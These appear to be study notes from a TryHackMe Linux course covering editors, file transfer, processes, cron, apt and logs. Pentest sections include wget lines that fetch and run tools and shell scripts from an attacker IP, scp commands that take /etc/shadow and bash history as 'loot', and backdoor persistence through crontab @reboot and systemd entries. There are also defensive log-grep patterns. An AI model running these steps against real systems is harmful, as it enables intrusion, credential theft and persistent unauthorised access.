# 🐧 Linux Fundamentals Part 3 — Editors, Transfers, Processes,

# Cron, Packages & Logs

> **Source:** TryHackMe — Linux Fundamentals Part 3
> **Purpose:** Advanced Linux CLI for day-to-day security operations
> **Covers:** nano/vim, wget, scp, python3 http.server, ps/top/kill,
> systemctl, background/foreground, crontabs, apt, /var/log

---

## 🧒 Feynman Explanation — Linux as a Living System

A computer isn't just files sitting on a disk. It's a living
ecosystem of running programs (processes), scheduled events
(cron), automatic updates (apt), and a diary of everything
that happened (logs).

Part 3 teaches you to interact with this living system —
not just read files, but shape the environment, move tools
around, automate tasks, and investigate what's been happening.

---

## 🔷 I. Terminal Text Editors — nano & vim

### 🧒 Feynman Explanation

`echo "text" > file` is like leaving one sticky note.
A text editor is like having a full notepad — you can write,
erase, rewrite, and save multiple lines properly.

### Nano — Beginner-Friendly Editor

```bash
# Create or edit a file
nano myfile.txt
nano /etc/hosts
nano script.sh

# What you see inside nano:
# ─────────────────────────────────────────
# GNU nano 4.8          myfile.txt   Modified
#
# Hello TryHackMe
# I can write things here
#
# ^G Help  ^O Save  ^W Search  ^X Exit
# ─────────────────────────────────────────

# Nano keyboard shortcuts (^ = Ctrl):
Ctrl+O    # Save (Write Out) — then Enter to confirm
Ctrl+X    # Exit nano
Ctrl+W    # Search for text (Where Is)
Ctrl+K    # Cut current line
Ctrl+U    # Paste cut text
Ctrl+G    # Get Help
Ctrl+C    # Show current cursor position (line number)
Ctrl+_    # Go to specific line number
M-U       # Undo (M = Alt key)
M-E       # Redo
```

### VIM — Advanced Power Editor

```bash
# Open a file in vim
vim myfile.txt
vi myfile.txt    # older version, always available

# VIM has MODES — this trips up beginners!
# Normal mode   → navigate, run commands (default on open)
# Insert mode   → actually type text
# Visual mode   → select text
# Command mode  → save, quit, search

# Essential vim commands:
i          # enter Insert mode (start typing)
Esc        # return to Normal mode
:w         # save (write)
:q         # quit
:wq        # save AND quit
:q!        # quit WITHOUT saving (force)
:wq!       # save and quit (force)
dd         # delete current line
yy         # copy current line
p          # paste
/keyword   # search forward
n          # next search result
:set nu    # show line numbers
u          # undo
Ctrl+R     # redo

# Why learn vim?
# ✅ Available on EVERY Linux system (nano may not be)
# ✅ Syntax highlighting for code
# ✅ Fully customizable keyboard shortcuts
# ✅ Works over slow SSH connections
# ✅ Industry standard among sysadmins and developers
```

### Nano vs Vim — Which to Use?

```
Nano:  Quick edits, config files, beginners, one-time changes
Vim:   Writing scripts, code, large files, daily driver

For cybersecurity: know BOTH
  Nano for quick config edits during a pentest
  Vim for writing complex exploit scripts
  Either for editing /etc/hosts, crontabs, sudoers
```

---

## 🔷 II. File Transfer — wget, scp, python3 HTTP Server

### 🧒 Feynman Explanation

You need to get tools onto a target machine or get loot off it.
These three methods are your delivery trucks:

- `wget` — download from a URL (you need a URL)
- `scp` — encrypted copy over SSH (you need SSH access)
- `python3 -m http.server` — turn your machine into a download server

### wget — Download Files from the Web

```bash
# Basic download
wget https://example.com/file.txt

# Download and save with different name
wget -O output.txt https://example.com/file.txt

# Download from custom port
wget http://10.48.167.26:8000/exploit.sh

# Download silently (no output)
wget -q https://example.com/file.txt

# Download in background
wget -b https://example.com/largefile.iso

# Resume interrupted download
wget -c https://example.com/largefile.iso

# Pentest use: download tools to compromised machine
cd /tmp
wget http://YOUR_IP:8000/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```

### scp — Secure Copy Over SSH

```bash
# ── COPY FROM YOUR MACHINE → REMOTE ──────────────────────────────
# scp [local_file] [user]@[IP]:[remote_path]

scp important.txt ubuntu@192.168.1.30:/home/ubuntu/transferred.txt
# Copies important.txt from HERE to the remote machine

scp -r /local/folder/ ubuntu@192.168.1.30:/remote/folder/
# Copy an entire directory (-r = recursive)

# ── COPY FROM REMOTE → YOUR MACHINE ──────────────────────────────
# scp [user]@[IP]:[remote_file] [local_destination]

scp ubuntu@192.168.1.30:/home/ubuntu/documents.txt notes.txt
# Downloads documents.txt from remote → saves as notes.txt here

scp ubuntu@192.168.1.30:/var/log/auth.log ./evidence/
# Grab log files as evidence

# ── CUSTOM PORT (if SSH not on 22) ───────────────────────────────
scp -P 2222 file.txt user@server.com:/home/user/

# ── PENTEST USE CASES ─────────────────────────────────────────────
# Upload exploit to target
scp exploit.sh user@target:/tmp/

# Exfiltrate loot from compromised machine
scp user@target:/etc/shadow ./loot/shadow.txt
scp user@target:/home/user/.bash_history ./loot/
```

### python3 HTTP Server — Turn Your Machine Into a Server

```bash
# On YOUR machine (attacker/source):
cd /directory/with/files/
python3 -m http.server
# Serving HTTP on 0.0.0.0 port 8000

# Now your files are accessible at:
# http://YOUR_IP:8000/filename

# Specify custom port
python3 -m http.server 9999
# Serving HTTP on 0.0.0.0 port 9999

# On the REMOTE machine (target):
wget http://YOUR_IP:8000/linpeas.sh
wget http://10.10.14.5:8000/shell.sh
curl http://10.10.14.5:8000/exploit -o exploit

# ── PENTEST WORKFLOW ──────────────────────────────────────────────
# Step 1: On your Kali machine
cd /opt/tools/
python3 -m http.server 8080 &   # run in background

# Step 2: On compromised target
cd /tmp
wget http://KALI_IP:8080/linpeas.sh
wget http://KALI_IP:8080/pspy64
chmod +x linpeas.sh pspy64
./linpeas.sh | tee linpeas_output.txt

# Step 3: Get results back to Kali
scp user@target:/tmp/linpeas_output.txt ./loot/
```

### Transfer Method Comparison

| Method                | Requires                  | Encrypted         | Best For                      |
| --------------------- | ------------------------- | ----------------- | ----------------------------- |
| `wget`                | URL (HTTP server running) | ❌ (unless HTTPS) | Downloading tools to target   |
| `scp`                 | SSH credentials           | ✅ Always         | Secure bidirectional transfer |
| `python3 http.server` | Python3 on server         | ❌                | Quick file hosting from Kali  |
| `curl`                | URL                       | ❌ (unless HTTPS) | Download + immediate use      |

---

## 🔷 III. Processes — ps, top, kill, bg, fg

### 🧒 Feynman Explanation

Every running program is a "process" — it has a unique ID (PID),
uses CPU and RAM, and can be started, paused, or killed.
The kernel is the traffic manager keeping all processes in order.

### Viewing Processes

```bash
# See YOUR session's processes
ps
# Shows: PID, TTY, TIME, CMD

# See ALL processes from ALL users (the full picture)
ps aux
# a = all users
# u = user-oriented format
# x = include processes not attached to terminal

# Output columns:
# USER  PID  %CPU  %MEM  VSZ  RSS  TTY  STAT  START  TIME  COMMAND
# root    1   0.0   0.2  ...  ... ?    Ss   09:00   0:01  /sbin/init

# Real-time process monitor (like Windows Task Manager)
top
# Updates every 10 seconds
# Press q to quit
# Press k then PID to kill a process inside top
# Press M to sort by memory usage
# Press P to sort by CPU usage

# Better version of top (install separately)
htop
```

### Process Signals — Killing Processes

```bash
# Kill a process by PID
kill 1337        # SIGTERM — graceful shutdown (allows cleanup)
kill -9 1337     # SIGKILL — immediate force kill (no cleanup)
kill -15 1337    # SIGTERM explicitly
kill -19 1337    # SIGSTOP — pause/suspend the process

# Kill by name (no need to find PID)
killall apache2
pkill firefox

# Find PID before killing
ps aux | grep apache2
# Then: kill [PID]

# Signal types:
# SIGTERM (15) → "please stop when you're ready" — graceful
# SIGKILL  (9) → "STOP NOW, no arguments" — forceful
# SIGSTOP (19) → "pause, I'll resume you later" — suspend
```

### Background & Foreground Processes

```bash
# Run command in background (& operator)
python3 -m http.server &    # runs in background
cp largefile.iso /backup/ & # copy without locking terminal
nmap -sV -p- 192.168.1.1 & # scan in background
# Returns: [1] 12345 (job number + PID)

# Suspend current foreground process
# While a command is running, press:
Ctrl+Z    # Suspends (pauses) the current process

# Check background jobs
jobs
# Output: [1]+ Stopped    python3 -m http.server
#         [2]  Running    nmap -sV...

# Bring background job to foreground
fg         # brings most recent background job
fg %1      # brings job number 1
fg %2      # brings job number 2

# Resume a suspended process in background
bg %1      # resumes job 1 in background (don't bring to front)

# Pentest workflow:
nmap -sV -p- 192.168.1.0/24 &    # scan running in background
python3 -m http.server &           # server running in background
# Both running, terminal is FREE for other commands
jobs                               # check both are running
```

### How Processes Start — systemd & PID 1

```
When Linux boots:
  PID 0 → kernel itself
  PID 1 → systemd (init) → the mother of all processes

  systemd starts EVERYTHING else:
    └── apache2 (web server)
    └── sshd (SSH daemon)
    └── cron (scheduled tasks)
    └── [your processes when you login]

  All user programs are "children" of systemd.
  systemd manages their lifecycle.
```

### `systemctl` — Control Services

```bash
# Start a service
systemctl start apache2
systemctl start ssh
systemctl start mysql

# Stop a service
systemctl stop apache2

# Restart a service (stop then start)
systemctl restart apache2

# Check service status
systemctl status apache2
# Shows: active (running) ✅ or failed ❌ or inactive

# Enable service to start automatically at boot
systemctl enable apache2
systemctl enable ssh

# Disable service from starting at boot
systemctl disable apache2

# List all running services
systemctl list-units --type=service --state=running

# ── PENTEST USE CASES ─────────────────────────────────────────────
# Check what's running (reconnaissance)
systemctl list-units --type=service --state=running

# Check if SSH allows root login
systemctl status ssh
cat /etc/ssh/sshd_config | grep "PermitRootLogin"

# After privilege escalation, install persistence
systemctl enable backdoor.service   # starts on every reboot!
```

---

## 🔷 IV. Crontabs — Task Automation & Persistence

### 🧒 Feynman Explanation

Cron is an alarm clock that runs commands instead of playing music.
You set it once — "run this every day at 3am" — and it runs
forever without you doing anything. It's how systems automate
backups, updates, and maintenance. It's also how attackers
maintain persistence on a compromised machine.

### Crontab Syntax

```
MIN  HOUR  DOM  MON  DOW  CMD
 │    │     │    │    │    └── Command to run
 │    │     │    │    └── Day of Week (0=Sun, 6=Sat)
 │    │     │    └── Month (1-12)
 │    │     └── Day of Month (1-31)
 │    └── Hour (0-23)
 └── Minute (0-59)

* = wildcard (every value for this field)
*/12 = every 12 (every 12 hours, every 12 minutes, etc.)
```

### Crontab Examples

```bash
# Backup Documents every 12 hours
0 */12 * * * cp -R /home/user/Documents /var/backups/

# Run a script every day at 3:00 AM
0 3 * * * /home/user/backup.sh

# Run every minute (for testing)
* * * * * echo "tick" >> /tmp/ticks.log

# Run every Monday at 9:00 AM
0 9 * * 1 /scripts/weekly_report.sh

# Run on the 1st of every month at midnight
0 0 1 * * /scripts/monthly_cleanup.sh

# Run every 5 minutes
*/5 * * * * /scripts/check_service.sh

# ── QUICK REFERENCE ───────────────────────────────────────────────
# @reboot     → run once at system startup
# @hourly     → 0 * * * *
# @daily      → 0 0 * * *
# @weekly     → 0 0 * * 0
# @monthly    → 0 0 1 * *
```

### Managing Crontabs

```bash
# Edit YOUR crontab
crontab -e
# Opens in nano/vim — add your cron jobs

# List your crontabs
crontab -l

# Remove your crontabs
crontab -r

# Edit another user's crontab (root only)
crontab -u username -e

# System-wide crontabs (different location)
cat /etc/crontab
ls /etc/cron.d/         # individual cron job files
ls /etc/cron.daily/     # scripts run daily
ls /etc/cron.weekly/    # scripts run weekly
ls /etc/cron.monthly/   # scripts run monthly

# Online tools to generate crontab syntax:
# crontab.guru
# crontabgenerator.net
```

### Crontabs in Cybersecurity

```bash
# ── ATTACKER: PERSISTENCE MECHANISM ──────────────────────────────
# After getting a shell, add a crontab to maintain access:
crontab -e
# Add: @reboot /tmp/.backdoor.sh
# Add: */5 * * * * /tmp/.shell.sh  # every 5 min reconnect

# ── DEFENDER: AUDIT CRONTABS ──────────────────────────────────────
# Check ALL users' crontabs for suspicious entries
cat /etc/crontab
crontab -l -u root       # root's crontabs
crontab -l -u www-data   # web server's crontabs
ls -la /var/spool/cron/  # all user crontab files

# Suspicious crontab indicators:
# /tmp/ paths (malware in tmp!)
# base64 encoded commands
# curl/wget calling external IPs
# Unknown scripts
# @reboot entries you didn't create
```

---

## 🔷 V. Package Management — apt

### 🧒 Feynman Explanation

`apt` is the App Store for Ubuntu. Every package is verified by
GPG keys (like a digital signature) ensuring you get the real
software, not a fake. Packages come from repositories —
curated lists of trusted software.

### Essential `apt` Commands

```bash
# Update package list (check for new versions)
sudo apt update
# Always run this BEFORE installing anything

# Upgrade all installed packages
sudo apt upgrade -y
# -y = yes to all prompts

# Update + upgrade in one line
sudo apt update && sudo apt upgrade -y

# Install a package
sudo apt install nmap
sudo apt install python3
sudo apt install vim
sudo apt install curl wget git

# Install multiple packages at once
sudo apt install nmap curl wget git vim python3 -y

# Remove a package (keep config files)
sudo apt remove packagename

# Remove package AND config files
sudo apt purge packagename

# Remove unused dependencies
sudo apt autoremove

# Search for a package
apt search keyword
apt search "text editor"

# Show package information
apt show nmap
apt show metasploit-framework

# List installed packages
apt list --installed
apt list --installed | grep python
```

### Adding Repositories (Custom Software)

```bash
# Method 1: add-apt-repository
sudo add-apt-repository ppa:repository/name
sudo apt update
sudo apt install software-name

# Method 2: Manual (for Sublime Text example)
# Step 1: Download and trust the GPG key
wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | \
  sudo apt-key add -

# Step 2: Add repository to sources
echo "deb https://download.sublimetext.com/ apt/stable/" | \
  sudo tee /etc/apt/sources.list.d/sublime-text.list

# Step 3: Update package lists
sudo apt update

# Step 4: Install the software
sudo apt install sublime-text

# Remove a repository
sudo add-apt-repository --remove ppa:repository/name
sudo rm /etc/apt/sources.list.d/sublime-text.list
sudo apt remove sublime-text
```

### Security Tools Installation Examples

```bash
# Essential security tools
sudo apt install nmap            # network scanner
sudo apt install wireshark       # packet analyzer
sudo apt install john            # password cracker
sudo apt install hydra           # login brute forcer
sudo apt install gobuster        # directory/DNS brute forcer
sudo apt install sqlmap          # SQL injection tool
sudo apt install nikto           # web vulnerability scanner
sudo apt install netcat-openbsd  # the Swiss Army knife

# Kali Linux already has most of these!
# On Ubuntu/Debian targets after compromise:
sudo apt install net-tools       # ifconfig, netstat
sudo apt install curl wget       # file transfer
sudo apt install python3-pip     # Python package manager
```

---

## 🔷 VI. Log Files — /var/log

### 🧒 Feynman Explanation

Logs are your system's diary — they record everything that
happened. For security professionals this is gold:

- SOC analysts read logs to detect attacks
- Forensic investigators read logs to reconstruct incidents
- Attackers delete or alter logs to cover their tracks

### Key Log Files

```bash
# ── AUTHENTICATION & LOGIN ─────────────────────────────────────────
/var/log/auth.log        # SSH logins, sudo usage, PAM auth
/var/log/wtmp            # all login/logout history (binary)
/var/log/btmp            # failed login attempts (binary)
/var/log/lastlog         # last login per user

# Read binary log files
last                     # reads /var/log/wtmp
lastb                    # reads /var/log/btmp (failed logins)
lastlog                  # reads /var/log/lastlog

# ── SYSTEM EVENTS ─────────────────────────────────────────────────
/var/log/syslog          # general system messages
/var/log/kern.log        # kernel messages
/var/log/dmesg           # boot-time hardware messages
/var/log/boot.log        # system boot log

# ── WEB SERVER ────────────────────────────────────────────────────
/var/log/apache2/access.log    # every HTTP request
/var/log/apache2/error.log     # server errors
/var/log/nginx/access.log      # nginx requests
/var/log/nginx/error.log       # nginx errors

# ── SECURITY TOOLS ────────────────────────────────────────────────
/var/log/fail2ban.log    # IPs blocked by fail2ban
/var/log/ufw.log         # firewall allow/block events

# ── PACKAGE MANAGEMENT ────────────────────────────────────────────
/var/log/apt/history.log # what was installed/removed and when
/var/log/dpkg.log        # low-level package actions
```

### Reading Logs Effectively

```bash
# Read auth log — look for failed SSH attempts
cat /var/log/auth.log

# Filter for failed logins only
grep "Failed password" /var/log/auth.log

# Count brute force attempts per IP
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -20

# Live monitoring (SOC analyst essential!)
tail -f /var/log/auth.log
tail -f /var/log/apache2/access.log

# Watch for a specific IP in real time
tail -f /var/log/auth.log | grep "192.168.1.100"

# Check web server logs for SQL injection attempts
grep "UNION SELECT\|1=1\|DROP TABLE" /var/log/apache2/access.log

# Check for 404 errors (directory brute forcing!)
grep " 404 " /var/log/apache2/access.log | \
  awk '{print $1}' | sort | uniq -c | sort -rn

# Check what was recently installed
cat /var/log/apt/history.log | tail -50

# Find log files (attacker recon of what's being logged)
ls -la /var/log/
ls -la /var/log/apache2/
```

### Log Rotation

```
Linux automatically manages log size through "log rotation":
  Old logs compressed and renamed: auth.log.1, auth.log.2.gz
  After a set number of rotations → oldest deleted
  Configured in /etc/logrotate.conf and /etc/logrotate.d/

Why this matters:
  Logs don't grow forever (no disk fill-up)
  But evidence may be rotated away after time
  Forensics: check compressed old logs too!
    zcat /var/log/auth.log.2.gz | grep "Failed"
```

---

## 🔷 Full Workflow — Day-to-Day Security Operations

```bash
# ── MORNING SOC CHECK ──────────────────────────────────────────────
# Check for overnight brute force attempts
grep "Failed password" /var/log/auth.log | \
  awk '{print $11}' | sort | uniq -c | sort -rn | head -10

# Check fail2ban for blocked IPs
tail -50 /var/log/fail2ban.log

# Check web server for scanning activity
grep " 404 " /var/log/apache2/access.log | wc -l

# Check system health
top
df -h
free -h

# ── PENTEST TOOLKIT SETUP (ON KALI) ───────────────────────────────
sudo apt update
sudo apt install nmap gobuster hydra john sqlmap nikto -y

# Start HTTP server to serve tools to targets
cd /opt/tools/
python3 -m http.server 8080 &

# ── POST-EXPLOITATION FILE TRANSFER ───────────────────────────────
# On target: download tools
wget http://KALI_IP:8080/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee /tmp/output.txt

# On Kali: retrieve results
scp user@target:/tmp/output.txt ./loot/

# ── PERSISTENCE (authorized red team only) ────────────────────────
crontab -e
# Add: @reboot /tmp/.persistence.sh

systemctl enable backdoor
```

---

## 🔷 Key Terminology — Quick Reference

| Term                    | Definition                                              |
| ----------------------- | ------------------------------------------------------- |
| **nano**                | Beginner-friendly terminal text editor                  |
| **vim**                 | Advanced terminal text editor, always available         |
| **wget**                | Download files from URLs via HTTP                       |
| **scp**                 | Securely copy files over SSH (bidirectional)            |
| **python3 http.server** | Quick HTTP server to serve files                        |
| **PID**                 | Process ID — unique number for each running process     |
| **ps aux**              | List all running processes from all users               |
| **top**                 | Real-time process and resource monitor                  |
| **SIGTERM**             | Graceful kill signal (process can clean up)             |
| **SIGKILL**             | Immediate force kill (no cleanup)                       |
| **systemctl**           | Control systemd services (start/stop/enable)            |
| **Crontab**             | Scheduled task file — runs commands automatically       |
| **apt**                 | Ubuntu's package manager (install/remove software)      |
| **GPG key**             | Cryptographic signature verifying software authenticity |
| **Log rotation**        | Automatic compression and cleanup of old log files      |

---

_Notes compiled from TryHackMe — Linux Fundamentals Part 3_
_Enriched with pentest workflows, SOC operations, and real-world context_
